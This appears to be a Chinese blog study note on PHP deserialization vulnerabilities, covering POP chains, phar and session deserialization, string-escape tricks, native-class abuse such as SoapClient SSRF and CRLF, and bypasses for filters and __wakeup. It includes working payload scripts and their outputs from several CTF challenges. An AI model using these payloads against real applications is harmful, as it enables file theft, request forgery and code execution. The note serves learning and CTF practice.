---
title: PHP反序列化
date: 2023/5/31 19:48:25
categories:
- PHP
tags:
- 反序列化
---

# 概念

- 序列化是将对象转化为数据字节流，反序列化是将数据字节流转换成对象。例如java采用二进制序列，PHP采用可见字符串序列。
- PHP反序列化漏洞主要发生在反序列化期间一些魔术方法的自动调用上



# 序列化

## 非类序列化

相比于类序列化少了对象名长度和对象名称

```php
<?php
$a=serialize("flag.php");
echo "$a\n";
$b=array('a'=>1,'b'=>2);
echo serialize($b);
?>
>>s:8:"flag.php"
>>a:2:{s:1:"a";i:1;s:1:"b";i:2;}
```



## 类序列化

```php
<?php
class info{
    public $name;
    pubilc function __construct(){
        this->name = 18
	}
}
$a=new info();
echo serialize($a);
?>
```

![image-20220620212404834](../images/image-20220620212404834.png)

> 可以发现序列化时只会序列化类的属性，而不会序列化类的方法。



### 类属性权限对序列化的影响

```php
<?php
class info{
    public $name=19;
    protected $b='123';
    private $c='khaz';
}
$a=new info();
echo serialize($a);
file_put_contents('1.txt',serialize($a));
?>
>>O:4:"info":3:{s:4:"name";i:19;s:4:"*b";s:3:"123";s:7:"infoc";s:4:"khaz";}
```

如果仔细观察会发现protected和private变量序列化后变量名长度发生了变化

- s:4:"*b";

- s:7:"infoc"

  我们用010打开1.txt

  ![image-20220714122008106](../images/image-20220714122008106.png)

​		可以发现protected序列化后，会在变量名前加上%00*%00

​		而private序列化后，会在变量名前加上%00类名%00

> 在实际运用中可以用\00（`空`）用%00代替
>
> 原因：php的`urlencode()`会自动把`空`编码成%00



## 魔术方法

[PHP: 魔术方法 - Manual](https://www.php.net/manual/zh/language.oop5.magic.php)

### 常见

```php
//类的构造函数，创建类对象时调用
__construct()

//类的析构函数，对象销毁时调用
__destruct()

//执行serialize()时，会先调用这个函数，再调用construct函数
__sleep()

//执行unserialize()时，会先调用这个函数，再调用destruct函数
__wakeup()

/*
当调用的方法不存在时触发
$name: 被调用方法的名字
$arguments：传递给被调用方法的参数
*/
__call(string $name, array $arguments)

/*
类被当成字符串时
1.输出对象：echo/print等 
2.函数的参数类型为字符串，将对象作为参数时
*/
__toString()
```


- __invoke()

  当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。

  ```php
  <?php
  class FileHandler {
      public function __invoke() {
          echo '触发了ivoke魔术方法';
      }
  }
  #实例化对象
  $a=new FileHandler();
  #以调用函数的方式调用一个对象
  $a();
  ?>
  >>触发了ivoke魔术方法
  ```

- 不可访问（protected 或 private）或不存在的属性

  赋值时，[__set()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.set) 会被调用。

  读取时，[__get()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.get) 会被调用。

  调用 [isset()](https://www.php.net/manual/zh/function.isset.php) 或 [empty()](https://www.php.net/manual/zh/function.empty.php) 时，[__isset()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset) 会被调用。

  调用 [unset()](https://www.php.net/manual/zh/function.unset.php) 时，[__unset()](https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset) 会被调用。

- 其他

  ```php
  __set_state()，调用var_export()导出类时，此静态方法会被调用。
  
  __clone()，当对象复制完成时调用
  
  __autoload()，尝试加载未定义的类
  
  __debugInfo()，打印所需调试信息
  ```

  

  


# 反序列化漏洞

### 原理

有序列化就有反序列化，漏洞点就产生于反序列化时。

因为序列化数据中存储的是类对象的属性，如果未对用户输入的序列化字符串进行检测，攻击者就可以构造恶意序列化数据，控制反序列化过程，从而**覆盖变量**，进而导致代码执行，SQL 注入，目录遍历等不可控后果。

### 攻击思路

1. 定位序列化和反序列化代码，找到可控参数和反序列化对象

2. 明确要利用的方法和属性

3. 根据其所在类的魔术方法构造pop链（传入参数到触发关键函数,注意类属性的类型）

   在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰。

4. 传递构造好的序列化内容(最好要urlencode一下)，触发反序列化，完成攻击

### Demo

```php
<?php
class example {
    public $str;
    public function __toString()
    {
        
        return $this->str->flag;
    }
}

class get {
    private $flag;
    public function __get($name)
    {
        include($name.$this->flag);
        return $flag;//flag in flag.php
    }
}

if(isset($_GET['a'])) {
    $a = unserialize($_GET['a']);
    echo $a;
    
} else {
    highlight_file(__FILE__);
}
```

这里目的是要触发 __get() 这个函数，魔术方法__get()会在由外部访问对象中的私有属性时自动调用，其中参数伪访问属性的属性名。再观察example这个类，这里发现 __toStrong() 方法，而又存在 `echo $a` 这句，所以可以确定要构造的这个 $a 就是 example这个类的对象，而且这个对象中的属性 $flag 也应为 get 这个类的对象，从而 执行 `return $this->str->flag`时就会跳转到 get 对象的 魔术方法 __get($name) （$name为要访问的私有属性的名称，即 flag 这个属性名）。

即链子为

```
反序列化入口unserialize() →  example::__tostring() →  get::__get() → 执行危险操作include()
```

之后要 include `'flag.php'`，由于$name == flag，所以要构造 $flag == ‘.php’ ，拼接起来就可以包含 ‘flag.php’ 从而拿到flag。

即

```php
<?php
class example {
    public $str;
}
class get {
    private $flag;
    function __construct($flag)
    {
        $this->flag = $flag;
    }
}
$a = new example();
$b = new get('.php');
$a->str = $b;
echo urlencode(serialize($a));
```



# phar反序列化--PHP<8

## phar是什么

1. 功能：压缩文件，将内容序列化存储

2. 如何生成：

   > 注意：要将php.ini中的phar.readonly选项设置为Off,并删除前面的;否则无法生成phar文件。

   ```php
   <?php
       class User{
           public $name='khaz';
           function __destruct(){
               echo "destruct";
           }
       }
       $phar = new Phar("test.phar");//生成的压缩文件名为test.phar
       $phar->startBuffering();
       //设置stub
       $phar->setStub("<?php __HALT_COMPILER(); ?>");
       //将自定义的meta-data存入manifest
       $a = new User();
       $phar->setMetadata($a);
       //添加要压缩的文件
       $phar->addFromString("test.txt", "test");
       //签名自动计算
       $phar->stopBuffering();
   ?>
   ```

3. 文件格式

   用010打开生成的test.phar，观察phar文件的四个组成部分

![image-20220708184054295](../images/image-20220708184054295.png)

​    关注stub和manifest

​	stub：phar识别标志，只要有了这个识别标志，**即使后缀名不为phar，php仍能够将文件识别为phar文件**

​	manifest：这一部分是我们可控的地方，是反序列化漏洞的关键点

​        signature：当我们需要改变phar文件内容时，需要重新生成签名

​     



## 漏洞成因

1. phar中manifest是用户自定义的

2. php一大部分的**文件系统函数在通过`phar://`伪协议解析phar文件时，都会将meta-data进行反序列化**.

   > 注意：使用`phar://`伪协议解析phar文件时，要使用文件的绝对路径

   ```php
   <?php
       class User{
           public $name;
           function __destruct(){
               echo "destruct";
           }
       }
   	#test.phar是上面生成代码生成的
       $a="phar://test.phar";
       file_get_contents($a);
   ?>
   ```

      ![image-20220708185428364](../images/image-20220708185428364.png)

   3.受到影响的函数

   From https://blog.zsxsoft.com/post/38?from=timeline&isappinstalled=0

   ![image-20220714125317293](../images/image-20220714125317293.png)

   ​		

   

## 绕过

1. 绕过phar开头

   ```php
   compress.bzip://phar:///test.phar/test.txt
   compress.bzip2://phar:///test.phar/test.txt
   compress.zlib://phar:///home/sx/test.phar/test.txt
   
   php://filter/read=convert.base64-encode/resource=phar://phar.phar
   ```

2. 绕过phar标识符`<?php __HALT_COMPILER(); ?>`

   ```shell
   gzip phar.phar #使用压缩后phar文件同样也能反序列化
   ```

3. 绕过文件后缀和内容

​	将`1.phar`改名为`1.jpg`，再给压缩`gzip 1.jpg`得到`1.jpg.gz`文件，修改名字为1.jpg上传





# session反序列化

https://xz.aliyun.com/t/6640#toc-5

## session工作流程

![20191026142328-1fba974c-f7b9-1](../images/20191026142328-1fba974c-f7b9-1-1685604427875.png)

## session序列化

`PHP session`的存储机制是由`session.serialize_handler`来定义引擎的，默认是以文件的方式存储，且存储的文件是由`sess_sessionid`来决定文件名的。

> 通常文件名为sess_sessionid的形式，默认的引擎是php

![image-20220730213222612](../images/image-20220730213222612.png)



## 产生的原因

session序列化和反序列化所使用到的引擎不同

例如

- 第一次请求，序列化用的引擎为php

  假设要保存到session的数据为username=khaz

  - php怎么知道要保存哪些数据到session中

    > 通过在$_SESSION环境变量注册

    ```php
    #将username变量保存到session中
    <?php
    $username = $_GET['username'];
    session_start();
    if (!isset($_SESSION['username'])) {
      $_SESSION['username'] = $username ;
    }
    ?>
    ```

  会话结束后，将$_SESSION序列化保存到session文件中。

  正常保存

  ```php
  a:1:{s:8:"username";s:4:"Khaz";}
  ```

  如果我们构造username=|a:1:{s:8:"passwd";s:4:"Khaz";}

  ```php
  a:1:{s:8:"username";s:31:"|a:1:{s:8:"passwd";s:4:"Khaz";}";}
  ```

- 第二次请求，反序列化用的引擎为php_serialize

  正常

  ```php
  a:1:{s:8:"username";s:4:"Khaz";}
  → $_SESSION['username']=Khaz
  ```

  攻击

  ```php
  a:1:{s:8:"username";s:31:"|a:1:{s:8:"passwd";s:4:"Khaz";}";}
  → $_SESSION['passwd']=Khaz
  ```

  > 从而我们就可以自定义$_SESSION环境变量的值



# 过滤不当导致的字符串逃逸反序列

## 形成原因

php反序列化特点

- 以}作为结束符，在}之后的字符会被舍去


```php
<?php 
$b='a:2:{s:1:"a";i:1;s:1:"b";i:2;}fdafadf';
var_dump(unserialize($b));
?>
>>
array(2) {
  'a' =>
  int(1)
  'b' =>
  int(2)
}
```



- 反序列化时会根据前面给定的长度，读取对应长度的字符串

```php
<?php 
$b='a:2:{s:4:"a";"";i:1;s:1:"b";i:2;}';
//s:4:"(a";")"; 括号只是标注处字符串
//长度为4从第一个"开始读取4个字符a";"
var_dump(unserialize($b));
?>
>>
array(2) {
  'a";"' =>
  int(1)
  'b' =>
  int(2)
}
```



- 当序列化的长度/数量与实际不符时，反序列化会报错


```php
<?php 
$b='a:2:{s:4:"a";i:1;s:1:"b";i:2;}';//s:4:"a"; 长度为4，实际字符串为a，长度为1
$a='a:3:{s:1:"a";i:1;s:1:"b";i:2;}';//a:3说明有三个值，实际上a=>1,b=>2,只有两个值
var_dump(unserialize($b));
var_dump(unserialize($a));
?>
>>
error  
error
```



当存在以下流程：序列化→过滤→反序列化

- 过滤：在对可控变量进行过滤了之后，就会使得其序列化的长度与字符串长度不匹配，然后反序列化的时候就会报错，无法执行反序列化，就不会执行攻击者构造的攻击代码。但是利用前面提到的第一和第二个特性，攻击者可以分析过滤前后字符串长度的变化，构造字符串(字符串形式为被过滤字符+目标子串)来覆盖其他变量。

- 目标字串：

  `";+序列化后的变量+}`

  例如我想要逃逸`$name='khaz'`，那么目标字串为`";s:4:"name";s:4:"khaz";}`



## 分类和思路

### 过滤后字符变多

```
思路：让过滤后的字符串填充完长度，从而让后面的变量解放出来
需要计算目标字串的长度l1和过滤后增加的长度l2
payload:被过滤字符*(l1/l2)+目标子串
```

```php
假设对变量$a进行过滤
过滤规则：a→bb
$a中的每个a在过滤后都会使字符串长度加1
    
假设目标子串为：";s:8:"password";s:6:"123456";} 一共31个字符
就需要重复a31次，构造$a='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";s:8:"password";s:6:"123456";}'
这样序列化后有：
s:62:"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";s:8:"password";s:6:"123456";}"
此时长度对应字符：62:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";s:8:"password";s:6:"123456";}

过滤后：
s:62:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:8:"password";s:6:"123456";}
长度对应字符： 62:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
从而使s:8:"password";s:6:"123456";解放出来
```

#### [0CTF 2016]piapiapia

www.zip得到源码，审计得到如下关键点

1. flag在config.php

2. 过滤函数

   ```php
   #用_代替\和\\
   $escape = array('\'', '\\\\');
   $escape = '/' . implode('|', $escape) . '/';
   $string = preg_replace($escape, '_', $string);
   
   #用hacker代替array('select', 'insert', 'update', 'delete', 'where')
   $safe = array('select', 'insert', 'update', 'delete', 'where');
   $safe = '/' . implode('|', $safe) . '/i';
   return preg_replace($safe, 'hacker', $string);
   ```

   字符串逃逸：字符串变多 where：5  →  hacker：6  

3. 反序列化点

   ```php
   $profile = unserialize($profile);
   $phone = $profile['phone'];
   $email = $profile['email'];
   $nickname = $profile['nickname'];
   $photo = base64_encode(file_get_contents($profile['photo']));
   ```

   字符串逃逸覆盖$photo为config.php

4. 序列化点

   ```php
   $profile['phone'] = $_POST['phone'];
   $profile['email'] = $_POST['email'];
   $profile['nickname'] = $_POST['nickname'];
   $profile['photo'] = 'upload/' . md5($file['name']);
   
   $user->update_profile($username, serialize($profile));
   ```

5. 正则

   ```php
   #11位数字
   if(!preg_match('/^\d{11}$/', $_POST['phone']))
   			die('Invalid phone');
   
   #xxx@xxx.xxx xxx限制[_a-zA-Z0-9]
   		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
   			die('Invalid email');
   		
   #长度<=10
   		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
   			die('Invalid nickname');
   ```

   需要绕过nickname的正则，用数组绕过即可。



需要逃逸的变量为`$photo='config.php'`，目标子串为`";s:5:"photo";s:10:"config.php";}`，共33个字符，一个where在替换后长度加1，所以需要33个where。

payload

```php
<?php
function filter($string){
    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}

$profile['phone'] = '12345678901';
$profile['email'] = '734541725@qq.com';
$profile['nickname'] = 'wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";s:5:"photo";s:10:"config.php";}';
$profile['photo'] = 'sadasd';

var_dump(serialize($profile));

$serialize_info = filter(serialize($profile));

echo "过滤后:",$serialize_info,"\n";

echo "反序列化后：";

var_dump(unserialize($serialize_info));
```

```php
string(320) "a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:16:"734541725@qq.com";s:8:"nickname";s:198:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";s:5:"photo";s:10:"config.php";}";s:5:"photo";s:6:"sadasd";}"
过滤后:a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:16:"734541725@qq.com";s:8:"nickname";s:198:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:5:"photo";s:10:"config.php";}";s:5:"photo";s:6:"sadasd";}
反序列化后：E:\浏览器下载\chrome\新建文件夹\2.php:21:
array(4) {
  'phone' =>
  string(11) "12345678901"
  'email' =>
  string(16) "734541725@qq.com"
  'nickname' =>
  string(198) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
  'photo' =>
  string(10) "config.php"
}
```

这里还要注意的点就是因为要绕过正则，所以nickname→nickname[]，数组序列化后就需要闭合{，所以

`nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}`

34个where，并且需要手动添加一个}来闭合多出的{

```php
<?php
$a[]=array(1);
var_dump(serialize($a));
>>
string(24) "a:1:{i:0;a:1:{i:0;i:1;}}"
```

<img src="../images/image-20221004202925741.png" alt="image-20221004202925741" style="zoom: 50%;" />





### 过滤后字符变少

```php
思路：过滤后字符减少，会吃掉后面的字符，所以需要计算过滤处到目标子串的长度
见下面例子，因为这种情况需要观察序列化字符串才能得到过滤处到目标子串的长度，而不是像过滤后字符变多那样可以直接构造。
```

#### [安洵杯 2019]easy_serialize_php

过滤函数

```php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
```

可控变量

```php
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
还有一个$_SESSION['img']是需要我们覆盖的变量
extract($_POST);
```

序列化→过滤→反序列化

```php
$serialize_info = filter(serialize($_SESSION));
$userinfo = unserialize($serialize_info);
echo file_get_contents(base64_decode($userinfo['img']));
```

目标子串

```php
base64_encode(d0g3_f1ag.php)='ZDBnM19mMWFnLnBocA=='
";s:20:"ZDBnM19mMWFnLnBocA==";}
```

观察序列化字符串

```php
<?php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';//过滤后字符减少3或者4
    return preg_replace($filter,'',$img);
}

$_SESSION["user"] = 'flag';
$_SESSION["function"] = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';//不可控变量，固定值base64_encode('guest_img.png')
    
echo  "过滤前:",serialize($_SESSION),"\n";

$serialize_info = filter(serialize($_SESSION));

echo "过滤后:",$serialize_info,"\n";

?>
    
>>
过滤前:
a:3:{s:4:"user";s:4:"flag";s:8:"function";
s:41:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";
s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
过滤后:
a:3:{s:4:"user";s:4:"";s:8:"function";s:41:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}

	需要计算过滤处到目标子串的长度：";s:8:"function";s:41:" 长度为23，不为3或4的倍数，最接近的是24，所以在
目标子串头添加任意一个字符变成a";s:20:"ZDBnM19mMWFnLnBocA==";}
	所以过滤后会吃掉24个字符，所以可以选择4*6或者3*8
```

payload:

```php
<?php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';//过滤后字符减少
    return preg_replace($filter,'',$img);
}

$_SESSION["user"]='flagflagflagflagflagflag';//过滤后向后吃24个字符，或者php*8
$_SESSION["function"]='a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"khaz";s:4:"haha";}';
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';//不可控变量，固定值


echo  "过滤前:",serialize($_SESSION),"\n";

$serialize_info = filter(serialize($_SESSION));

echo "过滤后:",$serialize_info,"\n";

var_dump(unserialize($serialize_info));
?>
>>

过滤前:
a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:64:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"khaz";s:4:"haha";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
过滤后:
a:3:{s:4:"user";s:24:"";s:8:"function";s:64:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"khaz";s:4:"haha";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}

E:\xampp2\php\www\2.php:19:
array(3) {
  'user' =>
  string(24) "";s:8:"function";s:64:"a"
  'img' =>
  string(20) "ZDBnM19mMWFnLnBocA=="
  'khaz' =>
  string(4) "haha"

```

```php
s:4:"khaz";s:4:"haha";添加了这个是因为$_SESSION有三个值(a:3),数量要对的上才能反序列化
s:4:"user";s:24:"";s:8:"function";s:64:"a";
s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";
s:4:"khaz";s:4:"haha";
```





# 原生类利用

## 常见场景

```php
echo new $this->key($this->value);
```



## 获取指定方法的原生类

```php
<?php
$classes = get_declared_classes(); foreach ($classes as $class) {
    $methods = get_class_methods($class); foreach ($methods as $method) {
        if (in_array($method, array( '__destruct',
        '__toString', '__wakeup',
        '__call',
        '__callStatic', '__get',
        '__set',
        '__isset',
        '__unset', '__invoke',
        '__set_state'	
        ))) {
    		print $class . '::' . $method . "\n";
    		}
    }
}
?>
```

> 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
>
> 比如说题目给的代码有MD5，eval等，这些函数的参数都是字符串类型，所以可以触发`__tostring`魔术方法



## Error/Exception 类

>用于自定义错误类型的	

|    类     | 适用版本  |                        属性（一样的）                        |
| :-------: | :-------: | :----------------------------------------------------------: |
|   Error   |   php7    | message：异常消息内容                                                           file：抛出异常的文件名 |
| Exception | php5/php7 | line：抛出异常在该文件中的行号                                         code：异常代码 |

```php
<?php
$a = new Error("payload",1);
$b = new Error("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;
```

```php
>>
Error: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\1.php:2
Stack trace:
#0 {main}

Error: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\1.php:3
Stack trace:
#0 {main}
```

仔细观察会发现只有异常代码code没有被输出，并且只有行号line不同



利用

> 可用来绕过类属性的哈希比较

```php
<?php
$a=new Error("payload",1);$b=new Error("payload",2);
echo $a;
echo "</br>";
echo $b;
echo "</br>";
echo 'md5($a)='.md5($a);
echo "</br>";
echo 'md5($b)='.md5($b);
echo "</br>";
echo 'sha1($a)='.sha1($a);
echo "</br>";
echo 'sha1($b)='.sha1($b);
echo "</br>";
if($a===$b)
echo '相同';
else
echo '不相同';
?>
```

![image-20220807151831343](../images/image-20220807151831343.png)

> 值不相同（对象，异常代码不同）,md5和sha1的值相同（输出的是一样的）

### [极客大挑战 2020]Greatphp

```php
if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) )
    
eval($this->syc);
```

多了一个eval

只需要将payload构造为`?><? payload?>`的形式即可,前面的`?>`把文件原来的`<?php`闭合了。

```php
<?php eval( ?>    <?php payload ?>        )    ?>
```



## SoapClient类

> 内置call方法，当call方法被调用时，就会发起http请求，可以伪造ssrf请求
>
> 并因为可以自定义user_agent请求头从而造成crlf漏洞。

可能会出现的问题[Fatal error: Uncaught Error: Class 'SoapClient' not found in](https://stackoverflow.com/questions/11391442/fatal-error-class-soapclient-not-found)

> CRLF注入是一类注入漏洞。是“回车+换行”的简称，又叫做回车换行符。
> 表示为`\r\n`，编码之后是`%0d%0a`。这个在HTTP协议中表示消息头与消息体之间的分隔。
>
> 浏览器就是根据这两个CRLF来分离HTTPHeader与HTTPBody的。从而把HTTP内容显示出来。所以，如果我们能够控制HTTP消息头的字符，那么我们就能够注入一些恶意的换行。

例子SoapClient::call方法发送soap请求,伪造post数据

在linux下执行

```php
<?php
$target = "http://192.168.244.128:8888/";
$post_string = 'data=abc';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
);
$b = new SoapClient(null,
array('location' => $target,
	  'user_agent'=>'khaz^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,
        'uri'=>'hello'));
$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
echo urlencode($aaa);

//Test
$c = unserialize($aaa);
$c->notexists();

?>
```

<img src="../images/image-20221027114101336.png" alt="image-20221027114101336" style="zoom:67%;" />

因为我们设置了Content-length，那么读取了data=abc后就会舍弃掉后面的数据









## 文件操作类

注：FilesystemIterator 是DirectoryIterator的子类，所以可以将DirectoryIterator换为FilesystemIterator。

#### 遍历目录

```php
<?php
$dir=new DirectoryIterator("./");
foreach($dir as $tmp){
    echo($tmp."\n");
}
```

<img src="../images/image-20221128122840348.png" alt="image-20221128122840348" style="zoom:80%;" />



#### 查找文件

- 查找根目录的flag文件名

  ```php
  <?php
  $dir=new GlobIterator("f*");
  echo $dir."\n";
  ```

  ![image-20221128123553510](../images/image-20221128123553510.png)

  ```php
  <?php
  $dir=new DirectoryIterator("glob:///f*");
  echo $dir."\n";
  ```

![image-20221128123054538](../images/image-20221128123054538.png)

> ​	**GlobIterator 类支持直接通过模式匹配来寻找文件路径**



- 确认文件路径

  假设现在知道flag的文件名为flag，但不知道具体路径

  ```php
  <?php
  # 目录穿越
  $dir=new DirectoryIterator("glob://../../../flag");
  echo $dir."\n";
  ```

  ![image-20221128123216008](../images/image-20221128123216008.png)

  当输出flag时，说明路径是正确的。

  



#### 读取文件

```php
<?php
$f1ag=implode(array(new SplFileObject('/flag')));
print_r($f1ag);
```

![image-20221128122206828](../images/image-20221128122206828.png)







# 一些trick

[php(phar)反序列化漏洞及各种绕过姿势](https://pankas.top/2022/08/04/php(phar)反序列化漏洞及各种绕过姿势/#16进制绕过字符的过滤)

## GC机制绕过抛出异常

> 正常情况下抛出异常并且没有捕捉的话php是不会执行析构函数的
>
> 但在laravel这种框架里通常都有全局的错误处理与异常捕捉，显示通用的500或者错误页面。 只要异常被捕捉，后面的析构就会执行了。

```php
$a = serialize(array(new test, null));

$a = str_replace('i:1;N', 'i:0;N', $a);
```

> 因为**反序列化的过程是顺序执行**的，所以到第一个属性时，会将`Array[0]`设置为对象，同时我们又将`Array[0]`设置为`null`，这样前面的`test`对象便丢失了引用，就会被GC所捕获，就可以执行`__destruct`了



## 绕过正则

```php
if (preg_match('/^O:\d+/',$data)){
        die('nonono!');
    }else{
        return $data;
    }
```

- 用+O代替O

- 用数组绕过

  ```php
  serialize(array($a));
  ```





## 绕过字符过滤

```php
if(preg_match('/username/', $data)){
        echo("nonono!!!</br>");
    }
    else{
        return $data;
    }
```

```php
$a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';

$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
```

> 序列字符串中**表示字符类型的s大写时，会被当成16进制解析。**



## 绕过wake_up

- **php版本 PHP5<5.6.25，PHP7 < 7.0.10**

**反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过`__wakeup( )`的执行。**

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

```php
<?php 
class Demo { 
    private $file = 'fl4g.php';
}

$x= serialize(new Demo);
$x=str_replace('O:4', 'O:+4',$x);//绕过preg_match()
$x=str_replace(':1:', ':3:',$x);//绕过__wakeup()
echo base64_encode($x);
?>
```



## 绕过特定变量赋值

- 引用变量


```php
<?php
$b = 2;
$a = &$b;

echo '$b:'.$b.'$a:'.$a."\n";

$a=1;
echo '$b:'.$b.'$a:'.$a."\n";

$b =2;
echo '$b:'.$b.'$a:'.$a."\n";
```

![image-20221026153815014](../images/image-20221026153815014.png)

> 在php里&相当于两个变量都指向同一个地址，修改一个会影响到另一个。



## 通过可变函数调用类方法

```php
<?php
class A {
    public static function test() {
        echo "hello a\n";
    }
}

$a = 'A::test'; // 调用 A 的 test 静态方法
$a(); 

$a = [new a(), 'test'];
$a(); // 调用 A 的 test 静态方法

call_user_func($a); // 调用 A 的 test 静态方法

?>
```

![image-20231026200915540](../images/image-20231026200915540.png)